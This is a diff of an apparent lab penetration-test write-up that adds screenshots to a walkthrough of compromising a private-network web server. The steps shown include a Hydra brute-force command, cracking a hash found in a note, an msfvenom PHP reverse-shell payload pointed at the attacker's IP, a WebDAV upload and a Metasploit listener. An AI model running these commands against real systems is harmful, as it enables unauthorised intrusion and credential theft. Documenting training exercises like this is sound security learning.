@@ -17,16 +17,27 @@ I created mitigation measures for each exploit that I've successfully performed.
 
 -	I then went into the website to see to find any important directories. I was able to find a hidden directory at 192.168.1.105/company_folders/secret_folder that you need to login into as Ashton.
 
+![image](https://user-images.githubusercontent.com/92223941/167281335-956344b0-fdd2-4bee-af89-ebb9f989ae2c.png)
+
 -	On the Kali machine, I ran the Hydra tool with the command ***hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get http://192.168.1.105/company_folders/secret_folder*** on it that used brute force into the wordlist and found the password for it.
+
+![Hydra password](https://user-images.githubusercontent.com/92223941/167281384-6f05f062-0e78-4dce-ad56-1fad9ec91fe1.PNG)
 
 -	I then logged into the secret folder and found a personal note in it.
 
+![image](https://user-images.githubusercontent.com/92223941/167281416-4ab1c2f6-beef-43a8-808b-4bbf5874493d.png)
+
 -	After reading the personal note, I copied the hashed text that was was left for Ryan's account and put it on https://crackstation.net/ and cracked it on the website.
 
+![ryan password](https://user-images.githubusercontent.com/92223941/167281434-8f81988d-a4f1-4695-b83e-bb06cc285285.PNG)
 
 -	Now that I have username and password for Ryan, I can now create my php shell to put on their website. I did so by doing this command ***msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=80 -f raw > shell.php***
 
+![msfvenom](https://user-images.githubusercontent.com/92223941/167281455-8e01b643-d192-4939-8992-b3dca42cdc39.PNG)
+
 -	I then uploaded the shell into the webdav directory.
+
+![image](https://user-images.githubusercontent.com/92223941/167281502-8d68b727-b8e0-49b1-8bdf-87dc7e35cabb.png)
 
 -	I then ran Metasploit to listen to the shell on the target machine, so I can access it via remote. The commands I ran were:
 
@@ -38,9 +49,14 @@ I created mitigation measures for each exploit that I've successfully performed.
 	-	***show options***
 	-	***run***
 
+![snip 2](https://user-images.githubusercontent.com/92223941/167281556-7176de74-2fec-4aad-81e9-ae500111a626.PNG)
+
 -	I then clicked on the shell on the website after I ran the Metasploit and I was able now to now get remote access to the target machine.
 
 -	I then ran the command ***shell*** and went back to the root directory and then listed the directories and found the flag.
+
+![6](https://user-images.githubusercontent.com/92223941/167281652-3aa24019-0640-4643-a46b-da75072434c6.PNG)
+![7](https://user-images.githubusercontent.com/92223941/167281666-b48aaa30-140d-463c-8287-3653eb305899.PNG)
 
 
 
